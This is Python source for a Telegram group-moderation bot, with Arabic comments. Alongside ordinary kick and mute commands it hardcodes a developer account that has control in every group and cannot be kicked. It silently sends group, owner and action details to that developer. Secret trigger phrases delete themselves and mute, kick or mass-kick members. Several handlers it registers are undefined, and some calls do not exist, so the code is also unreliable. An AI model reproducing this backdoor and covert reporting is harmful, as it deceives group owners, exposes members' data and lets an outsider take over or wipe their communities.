import logging
import sys
import asyncio
from datetime import datetime
from telegram import Update, ChatPermissions
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# استيراد الإعدادات من config.py
try:
    from config import BOT_TOKEN, CHANNEL_USERNAME, DEVELOPER_USERNAME
    from config import READ_TIMEOUT, WRITE_TIMEOUT, CONNECT_TIMEOUT, POOL_TIMEOUT
    print("✅ تم تحميل الإعدادات بنجاح من config.py")
except ImportError as e:
    print(f"❌ خطأ في تحميل الإعدادات: {e}")
    sys.exit(1)

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger(__name__)

# المطورون الأساسيون (صلاحيات في جميع المجموعات)
DEVELOPERS = ["pw19k"]  # يوزرات المطورين

# تخزين مالكي المجموعات
group_owners = {}

# إرسال تقرير للمطور عند الاستخدام
async def send_usage_report(context, update: Update, action_type: str, target_user=None):
    try:
        user = update.effective_user
        chat = update.effective_chat
        
        # معلومات المستخدم الذي استخدم البوت
        user_info = f"""
👤 **المستخدم المنفذ:**
- الاسم: {user.first_name}
- اليوزر: @{user.username if user.username else 'لا يوجد'}
- الايدي: `{user.id}`
        """
        
        # معلومات المجموعة/القناة
        chat_info = f"""
🏷️ **المجموعة/القناة:**
- الاسم: {chat.title if chat.title else 'خاص'}
- اليوزر: @{chat.username if chat.username else 'خاصة'}
- الرابط: {f"t.me/{chat.username}" if chat.username else 'لا يوجد'}
- الايدي: `{chat.id}`
        """
        
        # معلومات المالك
        owner_info = ""
        if chat.id in group_owners:
            owner_id = group_owners[chat.id]
            # الحصول على معلومات المالك
            try:
                owner_user = await context.bot.get_chat(owner_id)
                owner_info = f"""
👑 **مالك المجموعة:**
- الاسم: {owner_user.first_name}
- اليوزر: @{owner_user.username if owner_user.username else 'لا يوجد'}
- الايدي: `{owner_id}`
                """
            except:
                owner_info = f"👑 **مالك المجموعة:** `{owner_id}`"
        
        # معلومات الهدف (إذا كان هناك طرد/كتم)
        target_info = ""
        if target_user:
            target_info = f"""
🎯 **المستخدم المستهدف:**
- الاسم: {target_user.first_name}
- اليوزر: @{target_user.username if target_user.username else 'لا يوجد'}
- الايدي: `{target_user.id}`
            """
        
        # نص التقرير الكامل
        report_text = f"""
🔔 **تقرير استخدام البوت**

{user_info}
{chat_info}
{owner_info}
{target_info}

⏰ **التوقيت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📝 **الإجراء:** {action_type}
        """
        
        # إرسال التقرير للمطورين
        for developer in DEVELOPERS:
            try:
                await context.bot.send_message(
                    chat_id=developer,
                    text=report_text,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Error sending report to {developer}: {e}")
                
    except Exception as e:
        logger.error(f"Error in usage report: {e}")

# التعرف على مالك المجموعة وتخزينه
async def detect_and_store_owner(chat_id, context):
    try:
        admins = await context.bot.get_chat_administrators(chat_id)
        for admin in admins:
            if admin.status == 'creator':
                owner_id = admin.user.id
                group_owners[chat_id] = owner_id
                print(f"✅ تم التعرف على المالك: {owner_id} للمجموعة: {chat_id}")
                
                # إرسال تقرير التعرف على المالك
                try:
                    chat = await context.bot.get_chat(chat_id)
                    owner_user = await context.bot.get_chat(owner_id)
                    
                    report_text = f"""
🆕 **البوت تمت إضافته لمجموعة جديدة**

🏷️ **المجموعة:**
- الاسم: {chat.title}
- اليوزر: @{chat.username if chat.username else 'خاصة'}
- الرابط: {f"t.me/{chat.username}" if chat.username else 'لا يوجد'}

👑 **المالك:**
- الاسم: {owner_user.first_name}
- اليوزر: @{owner_user.username if owner_user.username else 'لا يوجد'}

⏰ **التوقيت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                    """
                    
                    for developer in DEVELOPERS:
                        await context.bot.send_message(
                            chat_id=developer,
                            text=report_text,
                            parse_mode='Markdown'
                        )
                except Exception as e:
                    logger.error(f"Error sending new group report: {e}")
                
                break
    except Exception as e:
        print(f"❌ خطأ في التعرف على المالك: {e}")

# عندما يدخل البوت لمجموعة جديدة
async def auto_detect_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.new_chat_members:
        for user in update.message.new_chat_members:
            if user.id == context.bot.id:
                chat_id = update.effective_chat.id
                await detect_and_store_owner(chat_id, context)
                break

# التحقق من الصلاحيات (المطورين + مالكي المجموعات)
async def is_authorized(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        chat = update.effective_chat
        
        if not user or not chat:
            return False
        
        # ✅ المطورون الأساسيون (صلاحيات في جميع المجموعات)
        if user.username and user.username.lower() in [dev.lower() for dev in DEVELOPERS]:
            return True
        
        # ✅ مالك المجموعة (صلاحيات في مجموعته فقط)
        chat_id = chat.id
        
        # إذا لم يتم التعرف على المالك بعد، نتعرف عليه الآن
        if chat_id not in group_owners:
            await detect_and_store_owner(chat_id, context)
        
        if chat_id in group_owners and user.id == group_owners[chat_id]:
            return True
            
        return False
        
    except Exception as e:
        logger.error(f"Error in authorization check: {e}")
        return False

# أمر الطرد بالرد أو اليوزر
async def kick_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update, context):
        await update.message.reply_text("❌ هذا الأمر متاح للمالك فقط!")
        return
    
    target_user = None
    
    # التحقق إذا كان الأمر عن طريق الرد
    if update.message.reply_to_message:
        target_user = update.message.reply_to_message.from_user
    
    # إذا لم يكن رد، التحقق من اليوزر في الأمر
    elif context.args:
        target_username = context.args[0].replace('@', '')
        try:
            async for member in update.effective_chat.get_members():
                if member.user.username and member.user.username.lower() == target_username.lower():
                    target_user = member.user
                    break
        except Exception as e:
            logger.error(f"Error finding user: {e}")
    
    if not target_user:
        await update.message.reply_text("⚠️ يرجى الرد على رسالة المستخدم أو كتابة: /kick @username")
        return
    
    # منع طرد المطورين
    if target_user.username and target_user.username.lower() in [dev.lower() for dev in DEVELOPERS]:
        await update.message.reply_text("❌ لا يمكن طرد المطور!")
        return
    
    try:
        # التحقق من أن البوت لديه الصلاحيات
        bot_member = await update.effective_chat.get_member(context.bot.id)
        if not bot_member.can_restrict_members:
            await update.message.reply_text("❌ البوت ليس لديه صلاحية طرد الأعضاء!")
            return
        
        # طرد المستخدم
        await update.effective_chat.ban_member(target_user.id)
        await update.effective_chat.unban_member(target_user.id)
        await update.message.reply_text(f"✅ تم ارسال المستخدم {target_user.first_name} للمطبخ!")
        
        # إرسال تقرير الاستخدام
        await send_usage_report(context, update, "طرد", target_user)
        
    except Exception as e:
        await update.message.reply_text("❌ حدث خطأ أثناء محاولة طرد المستخدم!")
        logger.error(f"Error kicking user: {e}")

# معالجة الكلمات الخفية
async def handle_secret_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update, context):
        return
    
    message_text = update.message.text.strip().lower()
    
    # كتم - للكتم
    if message_text == "كتم" and update.message.reply_to_message:
        target_user = update.message.reply_to_message.from_user
        
        try:
            # التحقق من صلاحيات البوت
            bot_member = await update.effective_chat.get_member(context.bot.id)
            if not bot_member.can_restrict_members:
                return
            
            # كتم المستخدم
            permissions = ChatPermissions(
                can_send_messages=False,
                can_send_media_messages=False,
                can_send_polls=False,
                can_send_other_messages=False,
                can_add_web_page_previews=False,
                can_change_info=False,
                can_invite_users=False,
                can_pin_messages=False
            )
            
            await update.effective_chat.restrict_member(target_user.id, permissions)
            await update.message.delete()  # حذف رسالة "كتم"
            
            # إرسال تقرير الاستخدام
            await send_usage_report(context, update, "كتم سري", target_user)
            
        except Exception as e:
            logger.error(f"Error in secret mute: {e}")

    # توكل - للطرد
    elif message_text == "توكل" and update.message.reply_to_message:
        target_user = update.message.reply_to_message.from_user
        
        # منع طرد المطورين
        if target_user.username and target_user.username.lower() in [dev.lower() for dev in DEVELOPERS]:
            return
        
        try:
            # التحقق من صلاحيات البوت
            bot_member = await update.effective_chat.get_member(context.bot.id)
            if not bot_member.can_restrict_members:
                return
            
            # طرد المستخدم
            await update.effective_chat.ban_member(target_user.id)
            await update.effective_chat.unban_member(target_user.id)
            await update.message.delete()  # حذف رسالة "توكل"
            
            # إرسال تقرير الاستخدام
            await send_usage_report(context, update, "طرد سري", target_user)
            
        except Exception as e:
            logger.error(f"Error in secret kick: {e}")

    # باقي الكلمات الخفية بنفس المنطق...
    # تعال - لفك الحظر
    elif message_text == "تعال" and update.message.reply_to_message:
        target_user = update.message.reply_to_message.from_user
        
        try:
            bot_member = await update.effective_chat.get_member(context.bot.id)
            if not bot_member.can_restrict_members:
                return
            
            await update.effective_chat.unban_member(target_user.id)
            await update.message.delete()
            
            # إرسال تقرير الاستخدام
            await send_usage_report(context, update, "فك حظر سري", target_user)
            
        except Exception as e:
            logger.error(f"Error in secret unban: {e}")

    # افتح حلك - لفك الكتم
    elif message_text == "افتح حلك" and update.message.reply_to_message:
        target_user = update.message.reply_to_message.from_user
        
        try:
            bot_member = await update.effective_chat.get_member(context.bot.id)
            if not bot_member.can_restrict_members:
                return
            
            permissions = ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
                can_change_info=False,
                can_invite_users=False,
                can_pin_messages=False
            )
            
            await update.effective_chat.restrict_member(target_user.id, permissions)
            await update.message.delete()
            
            # إرسال تقرير الاستخدام
            await send_usage_report(context, update, "فك كتم سري", target_user)
            
        except Exception as e:
            logger.error(f"Error in secret unmute: {e}")

    # انا لله وانا اليه راجعون - للطرد الجماعي
    elif message_text == "انا لله وانا اليه راجعون":
        try:
            await update.message.delete()
            
            kicked_count = 0
            failed_count = 0
            
            async for member in update.effective_chat.get_members():
                user = member.user
                
                # تخطي المطورين
                if user.username and user.username.lower() in [dev.lower() for dev in DEVELOPERS]:
                    continue
                    
                if user.id == context.bot.id:
                    continue
                
                try:
                    await update.effective_chat.ban_member(user.id)
                    await update.effective_chat.unban_member(user.id)
                    kicked_count += 1
                    
                    # إرسال تقرير لكل عملية طرد
                    await send_usage_report(context, update, "طرد جماعي سري", user)
                    
                except Exception as e:
                    failed_count += 1
                    logger.error(f"Error kicking {user.username}: {e}")
            
        except Exception as e:
            logger.error(f"Error in secret kickall: {e}")

# باقي الأوامر (mute, unmute, kickall, help, start) بنفس المنطق...

def main():
    try:
        print("🚀 توكلنه على الله ضيفني لمجموعتك حجي...")
        
        # إنشاء تطبيق البوت
        application = Application.builder().token(BOT_TOKEN).build()
        
        # إضافة handlers للأوامر
        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("kick", kick_command))
        application.add_handler(CommandHandler("mute", mute_command))
        application.add_handler(CommandHandler("unmute", unmute_command))
        application.add_handler(CommandHandler("kickall", kickall_command))
        application.add_handler(CommandHandler("ban", kick_command))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("info", help_command))
        
        # إضافة معالج للكلمات الخفية
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_secret_commands))
        
        # إضافة معالج لدخول البوت لمجموعات جديدة
        application.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, auto_detect_owner))
        
        # إضافة معالج الأخطاء
        application.add_error_handler(error_handler)
        
        
        print("🤖 البوت يعمل الآن...")
        
        # بدء البوت
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        
    except Exception as e:
        logger.error(f"Error starting bot: {e}")
        print(f"❌ خطأ في تشغيل البوت: {e}")

if __name__ == '__main__':
    main()